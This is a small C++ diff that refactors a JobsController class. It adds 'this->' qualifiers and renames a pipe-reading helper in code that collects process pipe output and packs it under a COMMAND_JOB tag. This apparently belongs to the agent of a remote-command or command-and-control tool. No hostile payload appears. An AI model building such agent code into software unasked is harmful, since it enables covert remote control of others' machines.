@@ -4,19 +4,20 @@
 JobData JobsController::CreateJobData(ULONG taskId, WORD Type, WORD State, HANDLE object, WORD pid, HANDLE input, HANDLE output)
 {
     JobData jobData = { taskId, Type, State, object, pid, input, output };
-	jobs.push_back(jobData);
+	this->jobs.push_back(jobData);
 	return jobData;
 }
 
 void JobsController::ProcessJobs(Packer* packer)
 {
-	if ( !jobs.size() )
+	if ( !this->jobs.size() )
 		return;
 
-	for (int i = 0; i < jobs.size(); i++) {
+	for (int i = 0; i < this->jobs.size(); i++) {
 
         ULONG  available = 0;
-		LPVOID buffer = ReadFromPipe(jobs[i].pipeRead, &available);
+		LPVOID buffer = ReadDataFromAnonPipe(this->jobs[i].pipeRead, &available);
+
         if (available > 0) {
 			packer->Pack32(jobs[i].jobId);
 			packer->Pack32(COMMAND_JOB);
